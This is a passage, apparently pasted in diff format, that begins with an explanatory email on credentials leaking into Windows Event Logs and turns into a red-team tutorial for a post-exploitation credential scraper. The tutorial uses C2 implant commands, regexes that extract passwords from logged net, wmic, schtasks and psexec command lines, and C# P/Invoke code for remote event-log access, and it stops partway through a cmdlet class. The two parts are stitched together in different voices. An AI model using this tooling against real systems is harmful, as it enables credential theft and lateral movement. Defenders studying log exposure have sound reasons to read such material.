@@ -1,0 +1,901 @@
+Windows Event Logs are a valuable resource for understanding activities occurring on a system. However, under certain circumstances, these logs may unintentionally contain sensitive credentials (such as usernames and passwords), making them a target for malicious actors. This email aims to explain how credentials can end up in the logs, the methods attackers use to extract them, and detailed recommendations to mitigate this threat.
+
+Expanded Technical Details:
+
+      1.    Windows Event Logs Overview:
+      •     Types of Logs:
+      •     System Logs: Track events related to the operating system.
+      •     Application Logs: Contain events from installed applications.
+      •     Security Logs: Capture security-related events like login attempts (both successful and failed).
+      •     Logging Mechanism:
+      •     Windows automatically records events based on pre-configured settings.
+      •     The level of detail in logs can vary (Verbose, Information, Warning, Error)
+
+      2.    How Credentials Appear in Logs:
+      •     Debugging Information:
+      •     During application development, sensitive data might be logged to aid in debugging.
+      •     Example: A database connection string, including the username and password, being logged during connection failures.
+      •     Insecure Error Logging:
+      •     Some applications may log complete exception (error) details, including sensitive authentication information.
+      •     Example: Logging the full authentication details when a service connection fails.
+      •     Default Logging Settings:
+      •     Some applications leave logging settings at their default, potentially recording too much information.
+      •     Example: IIS logging full HTTP requests, including query parameters that might contain credentials.
+
+      3.    Practical Examples from the Report:
+      •     Example 1: Clear-Text Credentials in Web Application Logs:
+      •     Scenario: A web application connects to a SQL Server database.
+      •     Problem: When the connection fails, the application logs the full connection string, including the password.
+      •     Outcome: An attacker with access to the logs could use the credentials to access the database.
+      •     Example 2: Detailed PowerShell Logs:
+      •     Scenario: PowerShell scripts include encrypted credentials.
+      •     Problem: When these scripts run with verbose logging enabled, commands and parameters, including sensitive credentials, are recorded in the logs.
+      •     Outcome: Attackers can extract this information from logs for later use.
+      •     Example 3: Custom Windows Services Logging:
+      •     Scenario: A custom Windows service logs detailed events.
+      •     Problem: During authentication failures, the service logs both the username and password.
+      •     Outcome: Attackers can harvest these credentials from the logs and attempt unauthorized access.
+
+Credential Extraction Methods:
+
+      1.    Direct Access to Logs:
+      •     Locally Stored Log Files:
+      •     Log files are typically stored in directories such as C:\Windows\System32\winevt\Logs.
+      •     If an attacker gains access to the system, they can copy these files and analyze them externally.
+      2.    Using Log Parsing Tools:
+      •     Event Viewer:
+      •     A built-in Windows tool that allows users to browse event logs.
+      •     Attackers can search for keywords such as “Password” or “Credentials” within logs.
+      •     PowerShell Commands:
+      •     Get-WinEvent:
+      •     Used to collect event logs programmatically.
+      •     Example:
+
+Get-WinEvent -LogName Application | Where-Object { $_.Message -like "*password*" }
+
+
+      •     Select-String:
+      •     Searches within logs for patterns such as password or connection strings.
+
+      3.    Exploiting Vulnerabilities:
+      •     Privilege Escalation Vulnerabilities:
+      •     Exploiting known vulnerabilities to gain administrator-level access and view protected logs.
+      •     Malware:
+      •     Malware can be used to collect and exfiltrate logs to the attacker’s servers.
+
+Define the Parameter Block
+The first step of building a script to scrape credentials is to define the parameter block. This will create a nice UI for the operator to use in the SpecterInsight interactive session. We want to be able to provide options for scraping localhost and remote systems and for authenticating with impersonation or explicit credentials. We satisfy these requirements with three parameters across two parameter sets:
+Parameter Set 1: Impersonation
+ComputerName: The system to scrape events logs for credentials. The default is “localhost.”
+Parameter Set 2: Username and Password
+ComputerName: The system to scrape events logs for credentials. The default is “localhost.”
+Username: The fully qualified username to authenticate with (e.g. administrator@lab.net).
+Password: The password associated with the specified user.
+param (
+    [Parameter(ParameterSetName = "Impersonation", Mandatory = $False, HelpMessage = "System to search through logs.")]
+    [Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "System to search through logs.")]
+    [string]$ComputerName = "localhost",
+
+    [Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "The username to authenticate with.")]
+    [string]$Username,
+
+    [Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "The password to authenticate with.")]
+    [string]$Password
+)
+Step 2: Load Dependencies
+I going to leverage a few high-performance cmdlets from the SpecterInsight EventLog post-exploitation module. Specifically, the Get-Events cmdlet runs about 100 times faster than the Get-WinEvent cmdlet that is bundled with PowerShell.
+The “load” command instructs the implant to download and import the EventLog.dll module from the C2 server.
+#Load dependencies
+load EventLog;
+Step 3: Define Regular Expressions for Extracting Credentials
+The first thing i going to need is a regex for detecting passwords from commandline arguments. This expression is going to get a little messy, so I’m going to try and break it down into chunks. First, let’s take a look at what we’re trying to match against. That is, what are some examples of passwords as commandline args?
+
+
+Commandline	Password Argument Substring
+schtasks.exe /QUERY /S server.lab.net /U administrator@lab.net /P “1qaz!QAZ” /TN “MyTask”	/P “1qaz!QAZ”
+wmic /node:”remote_computer” /user:”username” /password:”password” computersystem get /format:list	/password:”password”
+psexec \remote_computer -u username -p password command	-p password
+Based on our examples above, it appears that we can make a general purpose regular expression that can identify passwords regardless of the specific executable used. Many of the examples above fall into the following pattern: (argument name)(delimiter)(password)
+So what i need to do is create three separate expressions and combine them all together: (1) argument, (2) delimiter, and (3) password. Let’s take a look at the argument name first. We need some way to uniquely identify the start of a password passed via the commandline. We’ll do that by matching on common password argument names.
+
+
+Regex	Matches	Description
+(?:-p)	-p	Exact match for a possible password arg.
+(?:-password)	-password	Exact match for a possible password arg.
+(?:-passwd)	-passwd	Exact match for a possible password arg.
+(?:–password)	–password	Exact match for a possible password arg.
+(?:–passwd)	–passwd	Exact match for a possible password arg.
+(?:/P)	/P	Exact match for a possible password arg.
+(?:/PASSWD)	/PASSWD	Exact match for a possible password arg.
+(?:/PASSWORD)	/PASSWORD	Exact match for a possible password arg.
+(?:(?:-p)|(?:-password)|(?:-passwd)|(?:–password)|(?:–passwd)|(?:/P)|(?:/PASSWD)|(?:/PASSWORD))	Any of the argument names shown above.	Creates a non-capturing group that matches on possible password argument names. We use non-capturing groups because we just need them to match, but we don’t need the value of the match later. We only really care about the password itself, not the argument name.
+
+The entire thing is wrapped in a non-capturing group with the ‘|’ character in between each sub-expression representing the “or” statement.
+
+Essentially, match on the presence of any one of these sub-expressions.
+Next, let’s take a look at the delimiter. Some programs use whitespace while others use a semicolon. i ’ll need to handle both with an OR statement.
+
+
+Regex	Matches	Description
+\s+		Match on at least one or more whitespace characters.
+\:	:	Some schemes require a semicolon followed by the argument value.
+(?:\s+|\:)	Either of the delimiters shown above.	Creates a non-capturing group to match on the two possible delimiters.
+Lastly, let’s take a look at the password segment. i want to be able to match on a continuous series of non-whitespace characters with at least one character or a set of characters in between quotes for folks who might put a space in their password.
+
+
+Regex	Matches	Description
+(?:\.|[^”\])*)”)	“Look at my password. It has sPaCeS in it!”	(?: …): This is a non-capturing group. It groups the expressions inside but doesn’t capture them for backreferences, meaning it doesn’t store the matched part for later use.
+
+\.: This matches a literal character after a backslash. The \ is an escape sequence to match a literal backslash (), and the . matches any single character. So together, \. matches any escaped character (like \” for escaped quotes or \ for an escaped backslash).
+
+|: This is an OR operator. It allows for a choice between the two patterns on either side.
+
+[^”\]: This part is a character class. The ^ at the beginning of the brackets negates the character set, so it matches any character except a double quote (“) or a backslash (). Essentially, it matches any non-escaped characters that aren’t quotes or backslashes.
+
+*: The asterisk is a quantifier that means “zero or more occurrences” of the preceding pattern. In this case, it’s applied to the non-capturing group (?:\.|[^”\]), meaning it will match any combination of escaped characters or non-quote/non-backslash characters, occurring zero or more times.
+
+“: This matches a literal double quote, indicating that the pattern ends when a double quote is encountered.
+\S+	summer2024password	\S+: matches on a continuous string of non-whitespace characters with at least one character.
+(?<password>(?:”((?:\.|[^”\])*)”)|(?:[^\s”]+))	Either of the two passwords shown above.	Creates a named capture group called “password” that will match on either of the two standard ways of typing a password in commandline arguments.
+
+We can later access the value matched by this capture group using the string “password” as the index into the capture groups.
+Here is our final regular expression. This would have been really hard to write flat-out, but it helped to break the problem down into smaller components. When i create the regex object, we specify the IgnoreCase and Compiled flags. The IgnoreCase will match on any casing of the string “password” for example, which is what we want. The Compiled flag will make the matching happen faster, which i want in case we’re matching against a lot of events.
+#Do some shenanigans to bxor the two options together in a way that is PowerShell 2.0 compliant
+$options = [System.Text.RegularExpressions.RegexOptions](([System.Int32][System.Text.RegularExpressions.RegexOptions]::Compiled) + ([System.Int32][System.Text.RegularExpressions.RegexOptions]::IgnoreCase));
+
+#Define a regular expression to parse the password
+$regex_password_str = '(?:(?:(?:-p)|(?:-password)|(?:-passwd)|(?:--password)|(?:--passwd)|(?:/P)|(?:/PASSWD)|(?:/PASSWORD))(?:\s+|\:)(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)))';
+$regex_password = New-Object System.Text.RegularExpressions.Regex($regex_password_str, $options);
+Now i will define an expression for extracting the username provided for authentication. This expression is going to follow the same patter as the password expression with three parts: (argname)(delimiter)(username). The structure of the expression will also be the exact same except for the argname component of the expression. Here is the final result:
+#Define a regular expression to parse the username
+$regex_username_str = '(?:(?:(?:-u)|(?:-user)|(?:-username)|(?:--user)|(?:--username)|(?:/u)|(?:/USER)|(?:/USERNAME))(?:\s+|\:)(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)))';
+$regex_username = New-Object System.Text.RegularExpressions.Regex($regex_username_str, $options);
+Whew, that was a lot, but now i have a fairly generic, agnostic to the particular command, method for finding and extracting credentials from commands run with named parameters for username and password… but as i saw in our ealier examples, there are some commands that have unnamed credential parameters. i ’ll need to build an expression for each one of them to identify the position parameter. While I am sure that there are more, I have only added a few expressions covering the net, wmic, schtasks, and psexec commands. Here is the result:
+$expressions = New-Object 'System.Collections.Generic.List[regex]';
+
+#"C:\Windows\system32\net.exe" user Administrator 1qaz!QAZ /domain 
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('net.+user\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#"C:\Windows\system32\net.exe" use \\server\share /user:domain\username password
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('net.+use\s+(?<share>\\\\\S+)\s+/USER:(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#schtasks.exe /CREATE /S 192.168.1.103 /RU SYSTEM /U administrator@lab.net /P "1qaz!QAZ" /SC ONCE /ST 23:59 /TN Test /TR hostname /F
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('schtasks.+/U\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+/P\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#wmic.exe /node:192.168.1.2 /user:administrator@lab.net /password:1qaz!QAZ computersystem get
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('wmic.+/user:\s*(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+/password:\s*(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#psexec \\remote_computer -u administrator@lab.net -p 1qaz!QAZ hostname
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('psexec.+-u\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+-p\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+Step 4: Query Events
+The next step is to extract events from the Windows Event Log that contain commandline arguments. The event we will be targetng is event ID 4688 – New Process Creation. The only time this event is logged with commandline arguments is when the ‘ProcessCreationIncludeCmdLine_Enabled” value located under the “HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit” key is set to 1. We should verify that the system is configured to capture commandline arguments before proceeding with the rest of the tactic.
+The following PowerShell command will check to see if process creation logging will include commandline arguments.
+Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit' -Name "ProcessCreationIncludeCmdLine_Enabled" | Select 'ProcessCreationIncludeCmdLine_Enabled'
+Here is the output for a system where commandline arguments logging is enabled. If this field does not exist or is set to 0, then this particular technique will not work. There may be other logs we can look at, but 4688 logs will not contain commandline args for us to parse.
+ProcessCreationIncludeCmdLine_Enabled
+-------------------------------------
+                                    1
+When I originally started building this script, I leveraged the Get-WinEvent cmdlet; however, I found that the performance of that cmdlet was absolutely terrible… something like 70 events per second was the max speed I could query events. The Get-WinEvent cmdlet took approximately 3 minutes just to extract the 15K 4688 events in my development environment. This really irritated me, so I wrote an entirely new module for SpecterInsight to provide a high performance version of Get-WinEvent that I named Get-Events. The SpecterInsight cmdlet runs approximately 100 times faster than Get-WinEvent and, in my totallly unbiased opinion, the output structure is easier to read.
+This tactic will still work with Get-WinEvent. The query is functionally equivalent, though the output structure of Get-WinEvent is a bit… different (i.e. absolute trash). The 4688 logs are found in the “Security” event log. i then filter for events where the EventID is 4688 and the CommandLine field is not empty. That query eliminates about 50% of the events that i need to look at on my development machine. Approximately 7K results are returned in 2 – 5 seconds locally, but takes a bit longer when run remotely.
+Let’s take a quick detour to see how i can improve performance of event log queries by directly calling Windows APIs from .NET.
+The first thing i need to do is use Platform Invoke (P/Invoke) to expose a set of Windows APIs provided by wevtapi.dll. Here are the set of methods that i need to import:
+
+
+DLL	Method Name	Description
+wevtapi.dll	EvtOpenSession	This method is used to connect to the Event Log service running on remote systems.
+wevtapi.dll	EvtQuery	This method is used to query events with parameters to specify the log name and query specific fields such as Event ID.
+wevtapi.dll	EvtNext	This method is used to pull the next event from a query object created by EvtQuery.
+wevtapi.dll	EvtRender	This method takes in an event handle from EvtNext and converts the event to the specified output format. For our purposes, we will render events to XML for processing in C#.
+wevtapi.dll	EvtClose	This method releases resources allocated by other wevtapi methods.
+I’m not going to go over converting each one of these, but let’s look at the EvtQuery method as an example. im going to convert it to a P/Invoke definition. The first step is to look up the method documentation at learn.microsoft.com. The EvtQuery method can be found here. The function definition looks like this:
+EVT_HANDLE EvtQuery(
+  [in] EVT_HANDLE Session,
+  [in] LPCWSTR    Path,
+  [in] LPCWSTR    Query,
+  [in] DWORD      Flags
+);
+manually crafting P/Invoke signatures, pinvoke.net is dead/janky (long live pinvoke.net), and the new source generators aren’t really designed for backwards compatibility with .NET 2.0… so I leverage ChatGPT for this (deceivingly) simple conversion. Here is the query I used:
+Convert this function definition to a p/Invoke signature in C#. Generate enums for flags. Don't give me an explanation of the code, just return the code itself:
+
+EVT_HANDLE EvtQuery(
+  [in] EVT_HANDLE Session,
+  [in] LPCWSTR    Path,
+  [in] LPCWSTR    Query,
+  [in] DWORD      Flags
+);
+That query generated the C# code shown below. ChatGPT actually got it right this time, but it might not on others. It’s important to note that either: (1) CharSet needs to be explicitly stated and cannot be ‘Auto’ or (2) each LPCWSTR needs to have the MarshalAs attribute explicitely stating that the type is a long pointer to a wide character string (LPWSTR). The ‘Auto’ CharSet will work in most cases, but if you do weird stuff like we do where you write modules to run on all .NET versions from .NET 2.0 to present day, you have to be explicit with your P/Invoke definitions. Older versions tend to screw you unexpectedly if you don’t. Just trust me and save yourself about 4 hours of debugging…
+using System;
+using System.Runtime.InteropServices;
+
+class NativeMethods {
+	[DllImport("wevtapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+	public static extern IntPtr EvtQuery(
+		IntPtr session,
+		[MarshalAs(UnmanagedType.LPWStr)] string path,
+		[MarshalAs(UnmanagedType.LPWStr)] string query,
+		EvtQueryFlags flags
+	);
+}
+
+[Flags]
+public enum EvtQueryFlags : uint {
+	EvtQueryChannelPath = 0x1,
+	EvtQueryFilePath = 0x2,
+	EvtQueryForwardDirection = 0x100,
+	EvtQueryReverseDirection = 0x200,
+	EvtQueryTolerateQueryErrors = 0x1000,
+	EvtQueryStrict = 0x2000
+}
+continue that process for the remaining native APIs to get something like this:
+using System;
+using System.Runtime.InteropServices;
+
+namespace EventLog.Native {
+	public enum EvtRenderFlags : int {
+		EvtRenderEventValues = 0,
+		EvtRenderEventXml = 1,
+		EvtRenderBookmark = 2
+	}
+
+	[Flags]
+	public enum EvtQueryFlags : int {
+		EvtQueryChannelPath = 0x1,
+		EvtQueryFilePath = 0x2,
+		EvtQueryForwardDirection = 0x100,
+		EvtQueryReverseDirection = 0x200,
+		EvtQueryTolerateQueryErrors = 0x1000
+	}
+
+	public enum EvtLoginClass : int {
+		EvtRpcLogin = 1
+	}
+
+	public enum EvtRpcLoginFlags {
+		EvtRpcLoginAuthDefault = 0,
+		EvtRpcLoginAuthNegotiate = 1,
+		EvtRpcLoginAuthKerberos = 2,
+		EvtRpcLoginAuthNTLM = 3
+	}
+
+	[StructLayout(LayoutKind.Sequential)]
+	public struct EVT_RPC_LOGIN {
+		[MarshalAs(UnmanagedType.LPWStr)] public string Server;
+		[MarshalAs(UnmanagedType.LPWStr)] public string User;
+		[MarshalAs(UnmanagedType.LPWStr)] public string Domain;
+		[MarshalAs(UnmanagedType.LPWStr)] public string Password;
+		public EvtRpcLoginFlags Flags;
+	}
+
+	public static class Wevtapi {
+		[DllImport("wevtapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+		public static extern IntPtr EvtOpenSession(EvtLoginClass loginClass, ref EVT_RPC_LOGIN login, int timeout, int flags);
+
+		[DllImport("wevtapi.dll", SetLastError = true)]
+		public static extern IntPtr EvtQuery(IntPtr session, [MarshalAs(UnmanagedType.LPWStr)] string path, [MarshalAs(UnmanagedType.LPWStr)] string query, EvtQueryFlags flags);
+
+		[DllImport("wevtapi.dll", SetLastError = true)]
+		public static extern bool EvtNext(IntPtr resultSet, int eventArraySize, [Out] IntPtr[] events, int timeout, int flags, ref int returned);
+
+		[DllImport("wevtapi.dll", SetLastError = true)]
+		public static extern bool EvtRender(IntPtr context, IntPtr eventHandle, EvtRenderFlags flags, int buffSize, IntPtr buffer, ref int buffUsed, out int propCount);
+
+		[DllImport("wevtapi.dll", SetLastError = true)]
+		public static extern void EvtClose(IntPtr handle);
+	}
+}
+Now,  just need to logic to query and extract events to PSObjects. Let’s start with calling the native APIs to extract events. First, ’ll need to define a method to connect to remote hosts using the Remote Event Log RPC endpoint service. Here’s how we do that:
+private static IntPtr Connect(string system = null, string username = null, string password = null) {
+	if (string.IsNullOrEmpty(system)
+		|| system.Equals(".")
+		|| system.Equals("localhost", StringComparison.InvariantCultureIgnoreCase)
+		|| system.Equals("127.0.0.1", StringComparison.InvariantCultureIgnoreCase)) {
+		return IntPtr.Zero;
+	}
+
+	string domain = null;
+	if (!string.IsNullOrEmpty(username)) {
+		Username pname = Username.Parse(username);
+		domain = pname.Domain;
+		username = pname.Name;
+	}
+
+	EVT_RPC_LOGIN login = new EVT_RPC_LOGIN {
+		Server = system,
+		User = username,
+		Domain = domain,
+		Password = password,
+		Flags = EvtRpcLoginFlags.EvtRpcLoginAuthDefault
+	};
+
+	IntPtr sessionHandle = Wevtapi.EvtOpenSession(EvtLoginClass.EvtRpcLogin, ref login, 0, 0);
+
+	if (sessionHandle == IntPtr.Zero) {
+		throw new Win32Exception("Failed to connect to the remote system.");
+	}
+
+	return sessionHandle;
+}
+Next, ’ll define a method to read the events. The Windows Event API returns objects that only have the metadata in them. ’ll need to ‘render’ each one to an output format that is suitable for us. In this case, we will render the event to XML and then use the .NET 2.0 compatible XmlDocument class to parse the XML of the event and convert it to PSObjects that we can more easily manipulate in PowerShell.
+public static List<PSObject> GetEvents(string logname, string query, string system = null, string username = null, string password = null, int timeout = Int32.MaxValue, int max = Int32.MaxValue) {
+	//Connect to remote if nexessary
+	IntPtr session = EventLogReader.Connect(system, username, password);
+
+	//Open the event log
+	IntPtr queryHandle = Wevtapi.EvtQuery(session, logname, query, EvtQueryFlags.EvtQueryForwardDirection);
+	if (queryHandle == IntPtr.Zero) {
+		throw new Win32Exception("Failed to query the event log.");
+	}
+
+	try {
+		IntPtr[] eventHandles = new IntPtr[50];
+		int returned = 0;
+		List<PSObject> events = new List<PSObject>();
+
+		while (Wevtapi.EvtNext(queryHandle, 1, eventHandles, timeout, 0, ref returned) && events.Count < max) {
+			foreach (IntPtr eventHandle in eventHandles) {
+				//Render the event as XML
+				int bufferUsed = 0;
+				int propertyCount = 0;
+
+				//Call EvtRender with bufferSize = 0 to get the required buffer size
+				Wevtapi.EvtRender(IntPtr.Zero, eventHandle, EvtRenderFlags.EvtRenderEventXml, 0, IntPtr.Zero, ref bufferUsed, out propertyCount);
+
+				//Allocate a buffer to hold the rendered XML
+				IntPtr buffer = Marshal.AllocHGlobal(bufferUsed);
+
+				try {
+					//Render the XML
+					if (Wevtapi.EvtRender(IntPtr.Zero, eventHandle, EvtRenderFlags.EvtRenderEventXml, bufferUsed, buffer, ref bufferUsed, out propertyCount)) {
+						string xml = Marshal.PtrToStringAuto(buffer);
+
+						//Generate PSObject with the appropriate fields
+						PSObject converted = EventLogReader.ConvertXmlToPSObject(xml);
+						events.Add(converted);
+					} else {
+						//Ignore errors for now. We want this function to continue (i.e. be error resistent).
+					}
+				} finally {
+					Marshal.FreeHGlobal(buffer);
+				}
+
+				Wevtapi.EvtClose(eventHandle);
+
+				if (events.Count >= max) {
+					break;
+				}
+			}
+		}
+
+		return events;
+	} finally {
+		Wevtapi.EvtClose(queryHandle);
+	}
+}
+As you can see in the method above,  need to have someway of recursively iterating over the XML nodes in the XmlDocument to extract the relevant attributes and values to build a PSObject. i do this with the following, rather non-trivial code:
+public static PSObject ConvertXmlToPSObject(string xml) {
+	XmlDocument document = new XmlDocument();
+	document.LoadXml(xml);
+	return (PSObject)EventLogReader.ConvertXmlToPSObject(document);
+}
+
+public static PSObject ConvertXmlToPSObject(XmlDocument xml) {
+	return (PSObject)EventLogReader.ConvertHelper(xml.DocumentElement);
+}
+
+private static object ConvertHelper(XmlNode current) {
+	List<XmlNode> children = EventLogReader.GetChildNodes(current);
+	if (current.NodeType == XmlNodeType.Text) {
+		return current.Value;
+	} else if (children.Count > 0) {
+		PSObject pso = new PSObject();
+		foreach (XmlNode node in current.ChildNodes) {
+			string name = node.Name;
+			if (node.Name.Equals("Data", StringComparison.InvariantCultureIgnoreCase)) {
+				XmlNode attribute = node.Attributes.GetNamedItem("Name");
+				if (attribute != null) {
+					name = attribute.Value;
+				}
+			}
+
+			if (node.NodeType == XmlNodeType.Text) {
+				return node.Value;
+			} else {
+				object value = EventLogReader.ConvertHelper(node);
+				pso.Properties.Add(new PSNoteProperty(name, value));
+			}
+		}
+		return pso;
+	} else if (current.Attributes.Count > 0) {
+		if (current.Name.Equals("Data", StringComparison.InvariantCultureIgnoreCase)) {
+			return string.Empty;
+		} else {
+			PSObject pso = new PSObject();
+			foreach (XmlAttribute attribute in current.Attributes) {
+				pso.Properties.Add(new PSNoteProperty(attribute.Name, attribute.Value));
+			}
+			return pso;
+		}
+	} else {
+		return new PSObject();
+	}
+}
+
+private static List<XmlNode> GetChildNodes(XmlNode current) {
+	List<XmlNode> nodes = new List<XmlNode>();
+	if(current.ChildNodes != null) {
+		foreach(XmlNode node in current.ChildNodes) {
+			if(node.NodeType == XmlNodeType.Attribute) {
+				continue;
+			}
+
+			nodes.Add(node);
+		}
+	}
+	return nodes;
+}
+
+Putting that all together, here is our full class for extracting event logs:
+using common.Classes;
+using EventLog.Native;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Management.Automation;
+using System.Runtime.InteropServices;
+using System.Xml;
+
+namespace EventLog {
+	public class EventLogReader {
+		public static List<PSObject> GetEvents(string logname, string query, string system = null, string username = null, string password = null, int timeout = Int32.MaxValue, int max = Int32.MaxValue) {
+			//Connect to remote if nexessary
+			IntPtr session = EventLogReader.Connect(system, username, password);
+
+			//Open the event log
+			IntPtr queryHandle = Wevtapi.EvtQuery(session, logname, query, EvtQueryFlags.EvtQueryForwardDirection);
+			if (queryHandle == IntPtr.Zero) {
+				throw new Win32Exception("Failed to query the event log.");
+			}
+
+			try {
+				IntPtr[] eventHandles = new IntPtr[50];
+				int returned = 0;
+				List<PSObject> events = new List<PSObject>();
+
+				while (Wevtapi.EvtNext(queryHandle, 1, eventHandles, timeout, 0, ref returned) && events.Count < max) {
+					foreach (IntPtr eventHandle in eventHandles) {
+						//Render the event as XML
+						int bufferUsed = 0;
+						int propertyCount = 0;
+
+						//Call EvtRender with bufferSize = 0 to get the required buffer size
+						Wevtapi.EvtRender(IntPtr.Zero, eventHandle, EvtRenderFlags.EvtRenderEventXml, 0, IntPtr.Zero, ref bufferUsed, out propertyCount);
+
+						//Allocate a buffer to hold the rendered XML
+						IntPtr buffer = Marshal.AllocHGlobal(bufferUsed);
+
+						try {
+							//Render the XML
+							if (Wevtapi.EvtRender(IntPtr.Zero, eventHandle, EvtRenderFlags.EvtRenderEventXml, bufferUsed, buffer, ref bufferUsed, out propertyCount)) {
+								string xml = Marshal.PtrToStringAuto(buffer);
+
+								//Generate PSObject with the appropriate fields
+								PSObject converted = EventLogReader.ConvertXmlToPSObject(xml);
+								events.Add(converted);
+							} else {
+								//Ignore errors for now. We want this function to continue (i.e. be error resistent).
+							}
+						} finally {
+							Marshal.FreeHGlobal(buffer);
+						}
+
+						Wevtapi.EvtClose(eventHandle);
+
+						if (events.Count >= max) {
+							break;
+						}
+					}
+				}
+
+				return events;
+			} finally {
+				Wevtapi.EvtClose(queryHandle);
+			}
+		}
+
+		private static IntPtr Connect(string system = null, string username = null, string password = null) {
+			if (string.IsNullOrEmpty(system)
+				|| system.Equals(".")
+				|| system.Equals("localhost", StringComparison.InvariantCultureIgnoreCase)
+				|| system.Equals("127.0.0.1", StringComparison.InvariantCultureIgnoreCase)) {
+				return IntPtr.Zero;
+			}
+
+			string domain = null;
+			if (!string.IsNullOrEmpty(username)) {
+				Username pname = Username.Parse(username);
+				domain = pname.Domain;
+				username = pname.Name;
+			}
+
+			EVT_RPC_LOGIN login = new EVT_RPC_LOGIN {
+				Server = system,
+				User = username,
+				Domain = domain,
+				Password = password,
+				Flags = EvtRpcLoginFlags.EvtRpcLoginAuthDefault
+			};
+
+			IntPtr sessionHandle = Wevtapi.EvtOpenSession(EvtLoginClass.EvtRpcLogin, ref login, 0, 0);
+
+			if (sessionHandle == IntPtr.Zero) {
+				throw new Win32Exception("Failed to connect to the remote system.");
+			}
+
+			return sessionHandle;
+		}
+
+		public static PSObject ConvertXmlToPSObject(string xml) {
+			XmlDocument document = new XmlDocument();
+			document.LoadXml(xml);
+			return (PSObject)EventLogReader.ConvertXmlToPSObject(document);
+		}
+
+		public static PSObject ConvertXmlToPSObject(XmlDocument xml) {
+			return (PSObject)EventLogReader.ConvertHelper(xml.DocumentElement);
+		}
+
+		private static object ConvertHelper(XmlNode current) {
+			List<XmlNode> children = EventLogReader.GetChildNodes(current);
+			if (current.NodeType == XmlNodeType.Text) {
+				return current.Value;
+			} else if (children.Count > 0) {
+				PSObject pso = new PSObject();
+				foreach (XmlNode node in current.ChildNodes) {
+					string name = node.Name;
+					if (node.Name.Equals("Data", StringComparison.InvariantCultureIgnoreCase)) {
+						XmlNode attribute = node.Attributes.GetNamedItem("Name");
+						if (attribute != null) {
+							name = attribute.Value;
+						}
+					}
+
+					if (node.NodeType == XmlNodeType.Text) {
+						return node.Value;
+					} else {
+						object value = EventLogReader.ConvertHelper(node);
+						pso.Properties.Add(new PSNoteProperty(name, value));
+					}
+				}
+				return pso;
+			} else if (current.Attributes.Count > 0) {
+				if (current.Name.Equals("Data", StringComparison.InvariantCultureIgnoreCase)) {
+					return string.Empty;
+				} else {
+					PSObject pso = new PSObject();
+					foreach (XmlAttribute attribute in current.Attributes) {
+						pso.Properties.Add(new PSNoteProperty(attribute.Name, attribute.Value));
+					}
+					return pso;
+				}
+			} else {
+				return new PSObject();
+			}
+		}
+
+		private static List<XmlNode> GetChildNodes(XmlNode current) {
+			List<XmlNode> nodes = new List<XmlNode>();
+			if(current.ChildNodes != null) {
+				foreach(XmlNode node in current.ChildNodes) {
+					if(node.NodeType == XmlNodeType.Attribute) {
+						continue;
+					}
+
+					nodes.Add(node);
+				}
+			}
+			return nodes;
+		}
+	}
+}
+The last thing we need to do is build a cmdlet to make it easier to call this from PowerShell. We essentially have three different parameter sets: one for local and two for remote using either impersonation or explicit credentials.
+using System;
+using System.Collections.Generic;
+using System.Management.Automation;
+
+namespace EventLog.Cmdlets {
+    [Cmdlet(VerbsCommon.Get, "Events")]
+    public class GetEvents : PSCmdlet {
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_LOCAL, Mandatory = true, Position = 0)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_IMPERSONATION, Mandatory = true, Position = 0)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = true, Position = 0)]
+        [ValidateNotNullOrEmpty]
+        public string Logname { get; set; }
+
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_LOCAL, Mandatory = false, Position = 1)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_IMPERSONATION, Mandatory = false, Position = 1)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = false, Position = 1)]
+        public string Query { get; set; } = "*";
+
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_LOCAL, Mandatory = false)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_IMPERSONATION, Mandatory = false)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = false)]
+        public int Timeout { get; set; } = Int32.MaxValue;
+
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_LOCAL, Mandatory = false)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_IMPERSONATION, Mandatory = false)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = false)]
+        public int Max { get; set; } = Int32.MaxValue;
+
